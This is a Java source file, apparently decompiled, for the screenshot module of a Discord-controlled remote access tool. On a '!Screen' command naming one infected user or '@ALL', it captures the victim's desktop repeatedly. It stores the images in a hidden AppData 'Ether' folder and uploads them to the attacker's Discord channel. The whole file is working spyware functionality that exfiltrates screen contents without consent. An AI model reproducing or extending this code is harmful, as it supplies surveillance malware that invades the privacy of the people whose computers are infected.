package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.File;

import me.Eclipse.Brain;
import me.Eclipse.Utils.FileData;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.utils.AttachmentOption;

public class ScreenModule {
    public static int ScreenCount;

    public static void run(MessageReceivedEvent var0) {
        MessageChannel var1 = var0.getChannel();
        Message var2 = var0.getMessage();
        if (var2.getChannel().getName().contains("module-screen")) {
            if (var2.getContentDisplay().startsWith("!Screen " + Brain.Username) || var2.getContentDisplay().startsWith("!Screen @ALL")) {
                String var3 = var2.getContentDisplay().replaceFirst("!Screen " + Brain.Username + " ", "").replaceFirst("!Screen @ALL ", "");
                if (FileData.Ether.exists()) {
                    try {
                        if (Integer.parseInt(var3) <= 0) {
                            Helper.sendMessage(Color.RED, "Module Screen (" + Brain.Username + ")", "Invalid number.", var0);
                            return;
                        }

                        for (int var4 = 1; var4 <= Integer.parseInt(var3); ++var4) {
                            ++ScreenCount;
                            Helper.screen("Screen_" + ScreenCount);
                            Helper.sendMessage(Color.GREEN, "Module Screen (" + Brain.Username + ")", "Number: " + var4 + ".", var0);
                            var1.sendFile(new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Screen_" + ScreenCount + ".png"), new AttachmentOption[0]).queue();
                            Thread.sleep(4000L);
                        }
                    } catch (InterruptedException | NumberFormatException var5) {
                        Helper.sendMessage(Color.RED, "Module Screen (" + Brain.Username + ")", "Invalid syntax.", var0);
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module Screen (" + Brain.Username + ")", "Folder not found.", var0);
                    FileData.Ether.mkdir();
                }
            }

        }
    }
}
